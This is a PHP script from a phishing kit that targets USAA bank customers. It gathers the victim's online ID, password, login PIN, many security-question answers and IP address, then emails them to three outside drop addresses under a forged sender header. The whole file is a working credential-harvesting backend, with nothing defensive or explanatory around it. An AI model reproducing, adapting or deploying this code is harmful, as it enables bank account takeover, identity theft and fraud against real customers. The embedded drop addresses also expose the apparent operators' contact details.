<?php
$ip = getenv("REMOTE_ADDR");
$message .= "----------USAA Spam ReZulT--------------------\n";
$message .= "Online ID : $j_username\n";
$message .= "Password : $j_password\n\n";
$message .= "Login Pin : $pin\n\n";
$message .= "---------------Security Questions and Answers---------------\n";
$message .= "Mascot at your last high school? : $HighSchoolMascot\n";
$message .= "Name of your first employer? : $FirstEmployer\n";
$message .= "First name of maternal grandmother? : $FirstMaternalGrandmother\n";
$message .= "City you got engaged in? : $CityEngage\n";
$message .= "City your mother was born in? : $CityMotherBorn\n";
$message .= "First name of maternal grandfather? : $FirstMaternalGrandfather\n";

$message .= "First name of first boyfriend/girlfriend? : $FirstDate\n";
$message .= "City your father was born in? : $CityFatherBorn\n";
$message .= "First name of your maid of honor/best man? : $WeddingHonor\n";
$message .= "Name of street you grew up on? : $StreetGrown\n";
$message .= "City you got married in? : $CityMarried\n";
$message .= "Your age at your wedding? : $WeddingAge\n";

$message .= "First name of paternal grandmother? : $PaternalGrandmother\n";
$message .= "First name of paternal grandfather? : $PaternalGrandfather\n";
$message .= "First name of first roommate in college? : $CollegeRoomate\n";
$message .= "City of first elementary school? : $ElementarySchoolCity\n";
$message .= "Name of first elementary school? : $ElementarySchoolName\n";
$message .= "City you met your spouse in? : $CitySpouse\n";
$message .= "---------Na God--------\n";
$message .= "IP Address : $ip\n";
$message .= "--------------+ Created in 2019 By [kwkwkw] +------------\n";

$send="Mcnallyarmy@gmail.com, softouch109@gmail.com, jaler50@yahoo.com";

$subject = "USAA ReZulT | $ip";
$headers = "From: Zion-Kid<logzz@eduz.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
?>